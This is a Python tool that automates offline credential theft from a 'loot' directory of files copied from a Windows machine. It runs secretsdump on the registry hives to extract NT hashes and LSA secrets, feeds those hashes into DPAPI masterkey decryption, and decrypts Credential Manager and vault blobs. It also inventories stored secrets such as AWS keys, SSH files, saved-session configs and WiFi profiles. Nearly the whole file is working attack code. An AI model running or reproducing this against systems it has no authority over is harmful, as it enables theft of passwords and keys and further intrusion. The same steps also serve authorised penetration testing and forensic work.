#!/usr/bin/env python3
from __future__ import annotations

import argparse
import hashlib
import json
import re
import shutil
import subprocess
from dataclasses import dataclass
from pathlib import Path
from typing import Dict, Iterable, List, Optional, Sequence, Set, Tuple


HASH_RE = re.compile(
    r"^(?P<user>[^:\s][^:]*):(?P<rid>\d+):(?P<LM>[0-9a-fA-F]{32}):"
    r"(?P<NT>[0-9a-fA-F]{32}):::"
)
GUID_RE = re.compile(r"\b[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}\b")
MASTERKEY_GUID_RE = re.compile(
    r"(?:Guid\s+MasterKey|MasterKey\s+GUID|MasterKey)\s*[:=]\s*"
    r"(?P<guid>[0-9a-fA-F-]{36})",
    re.IGNORECASE,
)
DECRYPTED_KEY_RE = re.compile(r"Decrypted(?:\s+Backup)?\s+key[^:]*:\s*(0x[0-9a-fA-F]+)", re.IGNORECASE)
KEY_LINE_RE = re.compile(r"(?:key|aes)[^:\n]*:\s*(0x[0-9a-fA-F]{32,128})", re.IGNORECASE)
FAIL_RE = re.compile(r"(cannot decrypt|error:|traceback|failed)", re.IGNORECASE)


@dataclass
class ToolResult:
    name: str
    command: List[str]
    returncode: int
    stdout: str
    stderr: str
    output_file: Optional[Path]

    @property
    def combined(self) -> str:
        return self.stdout + ("\n" if self.stdout and self.stderr else "") + self.stderr

    @property
    def ok(self) -> bool:
        text = self.combined
        return self.returncode == 0 and not FAIL_RE.search(text)


@dataclass
class MasterkeyCandidate:
    path: Path
    sid: Optional[str]
    profile: Optional[str]
    scope: str

    @property
    def guid(self) -> str:
        return self.path.name.lower()


@dataclass
class BlobCandidate:
    path: Path
    kind: str
    profile: Optional[str]


class Extractor:
    def __init__(self, args: argparse.Namespace) -> None:
        self.args = args
        self.loot_root = args.loot.resolve()
        self.windows_root = self.resolve_windows_root(self.loot_root)
        self.out_dir = args.output.resolve() if args.output else None
        self.raw_dir = self.out_dir / "raw-tool-output" if self.out_dir else None
        self.report_path = self.out_dir / "REPORT.md" if self.out_dir else None
        self.summary_path = self.out_dir / "summary.json" if self.out_dir else None
        self.secretsdump = find_tool(["secretsdump.py", "impacket-secretsdump"])
        self.dpapi = find_tool(["dpapi.py", "impacket-dpapi"])
        self.events: List[Dict[str, object]] = []
        self.command_outputs: Dict[str, str] = {}
        self.hashes_by_user: Dict[str, str] = {}
        self.keys_by_guid: Dict[str, List[str]] = {}
        self.vault_keys_by_dir: Dict[str, List[str]] = {}

    @staticmethod
    def resolve_windows_root(root: Path) -> Path:
        if (root / "windows").is_dir():
            return root / "windows"
        if (root / "Windows" / "System32" / "config").is_dir():
            return root
        raise SystemExit(f"loot root does not contain windows/ or Windows/System32/config: {root}")

    def log(self, level: str, message: str, **extra: object) -> None:
        item: Dict[str, object] = {"level": level, "message": message}
        item.update(extra)
        self.events.append(item)
        prefix = {"ok": "[+]", "info": "[*]", "skip": "[-]", "warn": "[!]", "fail": "[!]"}[level]
        print(f"{prefix} {message}")

    def run(self) -> int:
        if self.out_dir and self.raw_dir:
            self.out_dir.mkdir(parents=True, exist_ok=True)
            self.raw_dir.mkdir(parents=True, exist_ok=True)

        self.log("info", f"loot root: {self.loot_root}")
        self.log("info", f"windows root: {self.windows_root}")
        if self.out_dir:
            self.log("info", f"saving raw output and report under: {self.out_dir}")
        self.check_tools()
        self.inventory_artifacts()

        if not self.args.no_secretsdump:
            self.run_secretsdump()

        if not self.args.no_dpapi:
            self.run_dpapi()

        if self.out_dir:
            self.write_report()
            self.log("ok", f"report written: {self.report_path}")
        return 0 if not any(e["level"] == "fail" for e in self.events) else 1

    def check_tools(self) -> None:
        if self.secretsdump:
            self.log("ok", f"found secretsdump: {self.secretsdump}")
        else:
            self.log("warn", "secretsdump.py not found; SAM/LSA extraction will be skipped")

        if self.dpapi:
            self.log("ok", f"found dpapi: {self.dpapi}")
        else:
            self.log("warn", "dpapi.py not found; DPAPI extraction will be skipped")

    def inventory_artifacts(self) -> None:
        hives = ["SAM", "SYSTEM", "SECURITY", "SOFTWARE", "DEFAULT"]
        present_hives = [name for name in hives if self.file(f"Windows/System32/config/{name}").is_file()]
        missing_hives = [name for name in hives if name not in present_hives]
        self.log("info", "registry hives present: " + (", ".join(present_hives) if present_hives else "none"))
        if missing_hives:
            self.log("warn", "registry hives missing: " + ", ".join(missing_hives))

        regback = self.file("Windows/System32/config/RegBack")
        self.log("info" if regback.exists() else "skip", f"RegBack {'present' if regback.exists() else 'not collected'}")

        users = self.windows_root / "Users"
        profiles = sorted(p.name for p in users.iterdir() if p.is_dir()) if users.is_dir() else []
        self.log("info", f"user profile directories found: {len(profiles)}")

        protect_count = len(list(self.enumerate_masterkeys()))
        credential_count = len(list(self.enumerate_blobs("credential")))
        vpol_count = len(list(self.enumerate_blobs("vpol")))
        vcrd_count = len(list(self.enumerate_blobs("vcrd")))
        self.log("info", f"DPAPI masterkey files found: {protect_count}")
        self.log("info", f"DPAPI credential blobs found: {credential_count}")
        self.log("info", f"vault policy files found: {vpol_count}")
        self.log("info", f"vault credential files found: {vcrd_count}")

        extra_groups = {
            "PowerShell history": "Users/*/AppData/*/Microsoft/Windows/PowerShell/PSReadLine/*",
            "Notepad tab state": "Users/*/AppData/Local/Packages/Microsoft.WindowsNotepad_8wekyb3d8bbwe/LocalState/TabState/*",
            "Notepad++ backups": "Users/*/AppData/Roaming/Notepad++/backup/*",
            "Recent file links": "Users/*/AppData/Roaming/Microsoft/Windows/Recent/*",
            "WinSCP ini files": "Users/*/{Documents,AppData/Roaming}/WinSCP.ini",
            "mRemoteNG configs": "Users/*/AppData/*/mRemoteNG/*",
            "MobaXterm configs": "Users/*/{AppData/*,Documents}/MobaXterm/*",
            "AWS credentials": "Users/*/.aws/*",
            "SSH profile files": "Users/*/.ssh/*",
            "WiFi profiles": "ProgramData/Microsoft/Wlansvc/Profiles/Interfaces/*",
            "IIS config": "Windows/System32/inetsrv/config/*",
            "VNC config": "Program Files*/**/ultravnc.ini",
        }
        for label, pattern in extra_groups.items():
            paths = glob_paths(self.windows_root, pattern)
            self.log_found_paths(label, paths)

    def log_found_paths(self, label: str, paths: Sequence[Path]) -> None:
        if not paths:
            self.log("skip", f"{label}: no files found")
            return

        self.log("info", f"{label}: {len(paths)} file(s) found")
        for path in paths[:self.args.max_paths]:
            self.log("info", f"{label} found: {path.relative_to(self.windows_root)}")
        remaining = len(paths) - self.args.max_paths
        if remaining > 0:
            self.log("info", f"{label}: {remaining} more path(s) hidden; raise --max-paths to show more")

    def run_cmd(self, name: str, command: Sequence[str], secret_values: Sequence[str] = ()) -> ToolResult:
        output_file = self.raw_dir / f"{safe_name(name)}.txt" if self.raw_dir else None
        display = mask_command(command, secret_values)

        try:
            proc = subprocess.run(
                list(command),
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                encoding="utf-8",
                errors="replace",
                check=False,
            )
        except OSError as exc:
            if output_file:
                with output_file.open("w", encoding="utf-8", errors="replace") as fp:
                    fp.write("$ " + " ".join(display) + "\n\n")
                    fp.write(f"exec failed: {exc}\n")
            self.command_outputs[name] = str(exc)
            return ToolResult(name, list(command), 127, "", str(exc), output_file)

        result = ToolResult(name, list(command), proc.returncode, proc.stdout, proc.stderr, output_file)
        self.command_outputs[name] = result.combined

        if output_file:
            with output_file.open("w", encoding="utf-8", errors="replace") as fp:
                fp.write("$ " + " ".join(display) + "\n\n")
                fp.write(proc.stdout)
                if proc.stderr:
                    fp.write("\n--- stderr ---\n")
                    fp.write(proc.stderr)

        return result

    def run_secretsdump(self) -> None:
        if not self.secretsdump:
            return

        sam = self.file("Windows/System32/config/SAM")
        system = self.file("Windows/System32/config/SYSTEM")
        security = self.file("Windows/System32/config/SECURITY")

        missing = [name for name, path in (("SAM", sam), ("SYSTEM", system)) if not path.is_file()]
        if missing:
            self.log("skip", "secretsdump skipped; missing " + ", ".join(missing))
            return

        cmd = [self.secretsdump, "-sam", str(sam), "-system", str(system)]
        if security.is_file():
            cmd.extend(["-security", str(security)])
        else:
            self.log("warn", "SECURITY hive missing; secretsdump will only use SAM/SYSTEM")
        cmd.append("LOCAL")

        result = self.run_cmd("secretsdump", cmd)
        if result.returncode != 0:
            self.log_tool_status("warn", f"secretsdump returned {result.returncode}", result)
        else:
            self.log_tool_status("ok", "secretsdump completed", result)

        parsed = self.parse_hashes(result.combined)
        if parsed:
            self.hashes_by_user.update(parsed)
            self.log("ok", f"parsed {len(parsed)} local NT hash(es) from secretsdump output")
            if not self.out_dir:
                for user, nthash in sorted(parsed.items()):
                    self.log("ok", f"local hash: {user}:{nthash}")
        else:
            self.log("warn", "no local NT hashes parsed from secretsdump output")

        if not self.out_dir:
            self.emit_secret_lines("secretsdump", result.combined)

    @staticmethod
    def parse_hashes(text: str) -> Dict[str, str]:
        hashes: Dict[str, str] = {}
        for line in text.splitlines():
            match = HASH_RE.match(line.strip())
            if not match:
                continue
            user = match.group("user")
            if user.endswith("$"):
                continue
            hashes[user.lower()] = match.group("NT").lower()
        return hashes

    def run_dpapi(self) -> None:
        if not self.dpapi:
            return

        masterkeys = list(self.enumerate_masterkeys())
        credentials = list(self.enumerate_blobs("credential"))
        vpols = list(self.enumerate_blobs("vpol"))
        vcrds = list(self.enumerate_blobs("vcrd"))

        self.log("info", f"found {len(masterkeys)} DPAPI masterkey candidate(s)")
        self.log("info", f"found {len(credentials)} credential blob(s), {len(vpols)} vault policy file(s), {len(vcrds)} vault credential file(s)")

        if not masterkeys:
            self.log("skip", "DPAPI decryption skipped; no masterkey files were collected")
            return

        self.inspect_blobs(credentials, vpols)
        self.decrypt_masterkeys(masterkeys)
        self.decrypt_credentials(credentials)
        self.decrypt_vaults(vpols, vcrds)

    def inspect_blobs(self, credentials: Sequence[BlobCandidate], vpols: Sequence[BlobCandidate]) -> None:
        for blob in credentials:
            rel = blob.path.relative_to(self.windows_root)
            result = self.run_cmd(f"dpapi-inspect-credential-{rel}", [self.dpapi, "credential", "-file", str(blob.path)])
            guid = parse_masterkey_guid(result.combined)
            if guid:
                self.log("info", f"credential uses masterkey {guid}: {rel}")

        for blob in vpols:
            rel = blob.path.relative_to(self.windows_root)
            result = self.run_cmd(f"dpapi-inspect-vpol-{rel}", [self.dpapi, "vault", "-vpol", str(blob.path)])
            guid = parse_masterkey_guid(result.combined)
            if guid:
                self.log("info", f"vault policy uses masterkey {guid}: {rel}")

    def decrypt_masterkeys(self, masterkeys: Sequence[MasterkeyCandidate]) -> None:
        system = self.file("Windows/System32/config/SYSTEM")
        security = self.file("Windows/System32/config/SECURITY")
        have_system_hives = system.is_file() and security.is_file()

        for mk in masterkeys:
            rel = mk.path.relative_to(self.windows_root)
            attempts = self.masterkey_attempts(mk, system, security, have_system_hives)
            if not attempts:
                self.log("skip", f"no key material available for masterkey {rel}")
                continue

            for label, cmd, secrets in attempts:
                result = self.run_cmd(f"dpapi-masterkey-{label}-{rel}", cmd, secrets)
                keys = parse_decrypted_keys(result.combined)
                if not keys:
                    continue
                self.keys_by_guid.setdefault(mk.guid, [])
                for key in keys:
                    if key not in self.keys_by_guid[mk.guid]:
                        self.keys_by_guid[mk.guid].append(key)
                self.log("ok", f"decrypted masterkey {mk.guid} using {label}")
                break

        total = sum(len(keys) for keys in self.keys_by_guid.values())
        if total:
            self.log("ok", f"recovered {total} decrypted DPAPI masterkey value(s)")
        else:
            self.log("warn", "no DPAPI masterkeys decrypted")

    def masterkey_attempts(
        self,
        mk: MasterkeyCandidate,
        system: Path,
        security: Path,
        have_system_hives: bool,
    ) -> List[Tuple[str, List[str], List[str]]]:
        attempts: List[Tuple[str, List[str], List[str]]] = []

        if mk.scope == "machine":
            if have_system_hives:
                attempts.append((
                    "system-hives",
                    [self.dpapi, "masterkey", "-file", str(mk.path), "-system", str(system), "-security", str(security)],
                    [],
                ))
            return attempts

        if not mk.sid:
            return attempts

        for value in values_for_identity(self.args.sid_password, mk.sid, None):
            attempts.append((
                "sid-password",
                [self.dpapi, "masterkey", "-file", str(mk.path), "-sid", mk.sid, "-password", value],
                [value],
            ))

        for value in values_for_identity(self.args.sid_hash, mk.sid, None):
            attempts.append((
                "sid-hash",
                [self.dpapi, "masterkey", "-file", str(mk.path), "-sid", mk.sid, "-key", "0x" + normalize_nt_hash(value)],
                [value, normalize_nt_hash(value)],
            ))

        if mk.profile:
            for value in values_for_identity(self.args.password, mk.profile, None):
                attempts.append((
                    "profile-password",
                    [self.dpapi, "masterkey", "-file", str(mk.path), "-sid", mk.sid, "-password", value],
                    [value],
                ))

            user_hashes = values_for_identity(self.args.hash, mk.profile, None)
            parsed_hash = self.hashes_by_user.get(mk.profile.lower())
            if parsed_hash:
                user_hashes.append(parsed_hash)

            for value in user_hashes:
                nthash = normalize_nt_hash(value)
                attempts.append((
                    "profile-hash",
                    [self.dpapi, "masterkey", "-file", str(mk.path), "-sid", mk.sid, "-key", "0x" + nthash],
                    [value, nthash],
                ))

        if self.args.try_all_hashes:
            all_hashes = sorted(set(self.hashes_by_user.values()))
            for nthash in all_hashes:
                attempts.append((
                    "any-local-hash",
                    [self.dpapi, "masterkey", "-file", str(mk.path), "-sid", mk.sid, "-key", "0x" + nthash],
                    [nthash],
                ))

        return attempts

    def decrypt_credentials(self, credentials: Sequence[BlobCandidate]) -> None:
        if not self.keys_by_guid:
            self.log("skip", "credential decryption skipped; no decrypted masterkeys available")
            return

        for blob in credentials:
            rel = blob.path.relative_to(self.windows_root)
            inspect = self.read_raw(f"dpapi-inspect-credential-{rel}")
            guid = parse_masterkey_guid(inspect) if inspect else None
            keys = self.keys_for_guid(guid)
            if not keys:
                self.log("skip", f"no matching masterkey for credential {rel}")
                continue

            for key in keys:
                result = self.run_cmd(
                    f"dpapi-credential-{rel}-{short_hash(key)}",
                    [self.dpapi, "credential", "-file", str(blob.path), "-key", key],
                    [key],
                )
                if result.ok:
                    self.log("ok", f"decrypted credential blob: {rel}")
                    if not self.out_dir:
                        self.emit_result_excerpt(f"credential {rel}", result.combined)
                    break

    def decrypt_vaults(self, vpols: Sequence[BlobCandidate], vcrds: Sequence[BlobCandidate]) -> None:
        if not self.keys_by_guid:
            self.log("skip", "vault decryption skipped; no decrypted masterkeys available")
            return

        for blob in vpols:
            rel = blob.path.relative_to(self.windows_root)
            inspect = self.read_raw(f"dpapi-inspect-vpol-{rel}")
            guid = parse_masterkey_guid(inspect) if inspect else None
            keys = self.keys_for_guid(guid)
            if not keys:
                self.log("skip", f"no matching masterkey for vault policy {rel}")
                continue

            vault_dir = str(blob.path.parent)
            for key in keys:
                result = self.run_cmd(
                    f"dpapi-vpol-{rel}-{short_hash(key)}",
                    [self.dpapi, "vault", "-vpol", str(blob.path), "-key", key],
                    [key],
                )
                vault_keys = parse_key_lines(result.combined)
                if vault_keys:
                    self.vault_keys_by_dir.setdefault(vault_dir, [])
                    for vault_key in vault_keys:
                        if vault_key not in self.vault_keys_by_dir[vault_dir]:
                            self.vault_keys_by_dir[vault_dir].append(vault_key)
                    self.log("ok", f"decrypted vault policy: {rel}")
                    if not self.out_dir:
                        self.emit_result_excerpt(f"vault policy {rel}", result.combined)
                    break

        for blob in vcrds:
            rel = blob.path.relative_to(self.windows_root)
            keys = self.vault_keys_by_dir.get(str(blob.path.parent), [])
            if not keys:
                self.log("skip", f"no decrypted vault policy key for {rel}")
                continue
            for key in keys:
                result = self.run_cmd(
                    f"dpapi-vcrd-{rel}-{short_hash(key)}",
                    [self.dpapi, "vault", "-vcrd", str(blob.path), "-key", key],
                    [key],
                )
                if result.ok:
                    self.log("ok", f"decrypted vault credential: {rel}")
                    if not self.out_dir:
                        self.emit_result_excerpt(f"vault credential {rel}", result.combined)
                    break

    def keys_for_guid(self, guid: Optional[str]) -> List[str]:
        if guid:
            keys = self.keys_by_guid.get(guid.lower(), [])
            if keys:
                return keys
        if self.args.try_all_masterkeys:
            return [key for keys in self.keys_by_guid.values() for key in keys]
        return []

    def read_raw(self, name: str) -> str:
        if name in self.command_outputs:
            return self.command_outputs[name]
        if not self.raw_dir:
            return ""
        path = self.raw_dir / f"{safe_name(name)}.txt"
        if not path.is_file():
            return ""
        return path.read_text(encoding="utf-8", errors="replace")

    def file(self, rel: str) -> Path:
        return self.windows_root / Path(rel)

    def enumerate_masterkeys(self) -> Iterable[MasterkeyCandidate]:
        roots = [
            self.file("Windows/System32/Microsoft/Protect"),
            self.file("ProgramData/Microsoft/Protect"),
            self.file("Windows/System32/config/systemprofile/AppData/Local/Microsoft/Protect"),
            self.file("Windows/System32/config/systemprofile/AppData/Roaming/Microsoft/Protect"),
        ]

        users = self.windows_root / "Users"
        if users.is_dir():
            for profile_dir in users.iterdir():
                if not profile_dir.is_dir():
                    continue
                for suffix in (
                    "AppData/Local/Microsoft/Protect",
                    "AppData/Roaming/Microsoft/Protect",
                ):
                    yield from enumerate_protect_root(profile_dir / suffix, "user", profile_dir.name)

        for root in roots:
            yield from enumerate_protect_root(root, "machine", None)

    def enumerate_blobs(self, kind: str) -> Iterable[BlobCandidate]:
        user_suffixes = {
            "credential": [
                "AppData/Local/Microsoft/Credentials",
                "AppData/Roaming/Microsoft/Credentials",
            ],
            "vpol": [
                "AppData/Local/Microsoft/Vault",
                "AppData/Roaming/Microsoft/Vault",
            ],
            "vcrd": [
                "AppData/Local/Microsoft/Vault",
                "AppData/Roaming/Microsoft/Vault",
            ],
        }[kind]
        system_roots = {
            "credential": [
                self.file("Windows/System32/config/systemprofile/AppData/Local/Microsoft/Credentials"),
                self.file("Windows/System32/config/systemprofile/AppData/Roaming/Microsoft/Credentials"),
            ],
            "vpol": [
                self.file("Windows/System32/config/systemprofile/AppData/Local/Microsoft/Vault"),
                self.file("Windows/System32/config/systemprofile/AppData/Roaming/Microsoft/Vault"),
                self.file("ProgramData/Microsoft/Vault"),
            ],
            "vcrd": [
                self.file("Windows/System32/config/systemprofile/AppData/Local/Microsoft/Vault"),
                self.file("Windows/System32/config/systemprofile/AppData/Roaming/Microsoft/Vault"),
                self.file("ProgramData/Microsoft/Vault"),
            ],
        }[kind]

        users = self.windows_root / "Users"
        if users.is_dir():
            for profile_dir in users.iterdir():
                if not profile_dir.is_dir():
                    continue
                for suffix in user_suffixes:
                    yield from enumerate_blob_root(profile_dir / suffix, kind, profile_dir.name)

        for root in system_roots:
            yield from enumerate_blob_root(root, kind, None)

    def write_report(self) -> None:
        if not self.out_dir or not self.raw_dir or not self.report_path or not self.summary_path:
            return

        summary = {
            "loot_root": str(self.loot_root),
            "windows_root": str(self.windows_root),
            "output": str(self.out_dir),
            "tools": {
                "secretsdump": self.secretsdump,
                "dpapi": self.dpapi,
            },
            "parsed_hash_users": sorted(self.hashes_by_user.keys()),
            "decrypted_masterkeys": sorted(self.keys_by_guid.keys()),
            "events": self.events,
        }
        self.summary_path.write_text(json.dumps(summary, indent=2), encoding="utf-8")

        lines = [
            "# Boot1oot Extraction Report",
            "",
            f"- Loot root: `{self.loot_root}`",
            f"- Windows root: `{self.windows_root}`",
            f"- Raw tool output: `{self.raw_dir}`",
            f"- Summary JSON: `{self.summary_path}`",
            "",
            "## Results",
            "",
        ]
        for event in self.events:
            lines.append(f"- `{event['level']}` {event['message']}")
        lines.append("")
        self.report_path.write_text("\n".join(lines), encoding="utf-8")

    def log_tool_status(self, level: str, message: str, result: ToolResult) -> None:
        if result.output_file:
            self.log(level, f"{message}; raw output: {result.output_file}")
        else:
            self.log(level, message)

    def emit_secret_lines(self, label: str, text: str) -> None:
        interesting = []
        markers = (
            "dpapi_system",
            "defaultpassword",
            "defaultusername",
            "nl$km",
            "_sc_",
            "cached domain logon",
        )
        for line in text.splitlines():
            stripped = line.strip()
            if not stripped:
                continue
            if HASH_RE.match(stripped) or any(marker in stripped.lower() for marker in markers):
                interesting.append(stripped)

        if not interesting:
            return

        self.log("info", f"{label}: showing {min(len(interesting), self.args.max_lines)} result line(s)")
        for line in interesting[:self.args.max_lines]:
            print(line)
        if len(interesting) > self.args.max_lines:
            self.log("info", f"{label}: {len(interesting) - self.args.max_lines} more line(s) hidden; use -o to save raw output")

    def emit_result_excerpt(self, label: str, text: str) -> None:
        lines = []
        skip_prefixes = ("impacket v", "[*]", "$ ")
        for line in text.splitlines():
            stripped = line.rstrip()
            if not stripped:
                continue
            if stripped.lower().startswith(skip_prefixes):
                continue
            lines.append(stripped)

        if not lines:
            return

        self.log("info", f"{label}: showing {min(len(lines), self.args.max_lines)} result line(s)")
        for line in lines[:self.args.max_lines]:
            print(line)
        if len(lines) > self.args.max_lines:
            self.log("info", f"{label}: {len(lines) - self.args.max_lines} more line(s) hidden; use -o to save raw output")


def find_tool(names: Sequence[str]) -> Optional[str]:
    for name in names:
        found = shutil.which(name)
        if found:
            return found
    return None


def safe_name(value: object) -> str:
    text = str(value).replace("\\", "/")
    text = re.sub(r"[^A-Za-z0-9_.-]+", "_", text).strip("._")
    digest = hashlib.sha1(str(value).encode("utf-8", errors="ignore")).hexdigest()[:10]
    if len(text) > 120:
        text = text[-120:]
    return f"{text}-{digest}" if text else digest


def short_hash(value: str) -> str:
    return hashlib.sha1(value.encode("ascii", errors="ignore")).hexdigest()[:8]


def mask_command(command: Sequence[str], secrets: Sequence[str]) -> List[str]:
    masked = list(command)
    for secret in secrets:
        if not secret:
            continue
        masked = [part.replace(secret, "<secret>") for part in masked]
    return masked


def parse_kv(values: Sequence[str]) -> Dict[str, List[str]]:
    parsed: Dict[str, List[str]] = {}
    for value in values:
        if "=" not in value:
            raise SystemExit(f"expected KEY=VALUE, got: {value}")
        key, data = value.split("=", 1)
        key = key.strip().lower()
        if not key or not data:
            raise SystemExit(f"expected non-empty KEY=VALUE, got: {value}")
        parsed.setdefault(key, []).append(data)
    return parsed


def values_for_identity(mapping: Dict[str, List[str]], primary: str, fallback: Optional[str]) -> List[str]:
    values: List[str] = []
    for key in (primary, fallback):
        if key and key.lower() in mapping:
            values.extend(mapping[key.lower()])
    return values


def normalize_nt_hash(value: str) -> str:
    value = value.strip()
    if ":" in value:
        value = value.split(":")[-1]
    if value.lower().startswith("0x"):
        value = value[2:]
    if not re.fullmatch(r"[0-9a-fA-F]{32}", value):
        raise SystemExit(f"invalid NT hash: {value}")
    return value.lower()


def parse_masterkey_guid(text: str) -> Optional[str]:
    match = MASTERKEY_GUID_RE.search(text)
    if match:
        return match.group("guid").lower()
    match = GUID_RE.search(text)
    return match.group(0).lower() if match else None


def parse_decrypted_keys(text: str) -> List[str]:
    keys: List[str] = []
    for match in DECRYPTED_KEY_RE.finditer(text):
        key = match.group(1).lower()
        if key not in keys:
            keys.append(key)
    return keys


def parse_key_lines(text: str) -> List[str]:
    keys: List[str] = []
    for line in text.splitlines():
        if "key" not in line.lower():
            continue
        for match in KEY_LINE_RE.finditer(line):
            key = match.group(1).lower()
            if key not in keys:
                keys.append(key)
    return keys


def glob_paths(root: Path, pattern: str) -> List[Path]:
    patterns = expand_braces(pattern)
    seen: Set[Path] = set()
    for item in patterns:
        for path in root.glob(item):
            if path.is_file():
                seen.add(path)
    return sorted(seen)


def expand_braces(pattern: str) -> List[str]:
    start = pattern.find("{")
    if start < 0:
        return [pattern]
    end = pattern.find("}", start)
    if end < 0:
        return [pattern]

    prefix = pattern[:start]
    suffix = pattern[end + 1:]
    variants = pattern[start + 1:end].split(",")
    expanded: List[str] = []
    for variant in variants:
        expanded.extend(expand_braces(prefix + variant + suffix))
    return expanded


def enumerate_protect_root(root: Path, scope: str, profile: Optional[str]) -> Iterable[MasterkeyCandidate]:
    if not root.is_dir():
        return
    for sid_dir in root.iterdir():
        if not sid_dir.is_dir():
            continue
        sid = sid_dir.name
        for item in sid_dir.rglob("*"):
            if item.is_file() and GUID_RE.fullmatch(item.name):
                yield MasterkeyCandidate(item, sid, profile, scope)


def enumerate_blob_root(root: Path, kind: str, profile: Optional[str]) -> Iterable[BlobCandidate]:
    if not root.is_dir():
        return
    for item in root.rglob("*"):
        if not item.is_file():
            continue
        lower = item.name.lower()
        if kind == "vpol" and not lower.endswith(".vpol"):
            continue
        if kind == "vcrd" and not lower.endswith(".vcrd"):
            continue
        if kind == "credential" and lower.endswith((".vpol", ".vcrd")):
            continue
        yield BlobCandidate(item, kind, profile)


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Automate offline secretsdump and DPAPI extraction from a Boot1oot loot directory.",
    )
    parser.add_argument("loot", type=Path, help="Boot1oot loot directory containing windows/")
    parser.add_argument(
        "-o",
        "--output",
        type=Path,
        default=None,
        help="save REPORT.md, summary.json, and raw tool output to this directory",
    )
    parser.add_argument("--max-paths", type=int, default=20, help="maximum artifact paths to print per group")
    parser.add_argument("--max-lines", type=int, default=40, help="maximum result lines to print per tool output")
    parser.add_argument("--no-secretsdump", action="store_true", help="skip secretsdump.py")
    parser.add_argument("--no-dpapi", action="store_true", help="skip dpapi.py")
    parser.add_argument(
        "--password",
        action="append",
        default=[],
        metavar="USER=PASSWORD",
        help="user profile password for DPAPI masterkey decryption; can be repeated",
    )
    parser.add_argument(
        "--hash",
        action="append",
        default=[],
        metavar="USER=NTHASH",
        help="user profile NT hash for DPAPI masterkey decryption; can be repeated",
    )
    parser.add_argument(
        "--sid-password",
        action="append",
        default=[],
        metavar="SID=PASSWORD",
        help="SID-specific password for DPAPI masterkey decryption; can be repeated",
    )
    parser.add_argument(
        "--sid-hash",
        action="append",
        default=[],
        metavar="SID=NTHASH",
        help="SID-specific NT hash for DPAPI masterkey decryption; can be repeated",
    )
    parser.add_argument(
        "--try-all-hashes",
        action="store_true",
        help="try every parsed local NT hash against every user DPAPI SID",
    )
    parser.add_argument(
        "--try-all-masterkeys",
        action="store_true",
        help="if a blob's masterkey GUID cannot be matched, try all decrypted masterkeys",
    )
    return parser


def main(argv: Optional[Sequence[str]] = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    args.password = parse_kv(args.password)
    args.hash = parse_kv(args.hash)
    args.sid_password = parse_kv(args.sid_password)
    args.sid_hash = parse_kv(args.sid_hash)

    extractor = Extractor(args)
    return extractor.run()


if __name__ == "__main__":
    raise SystemExit(main())
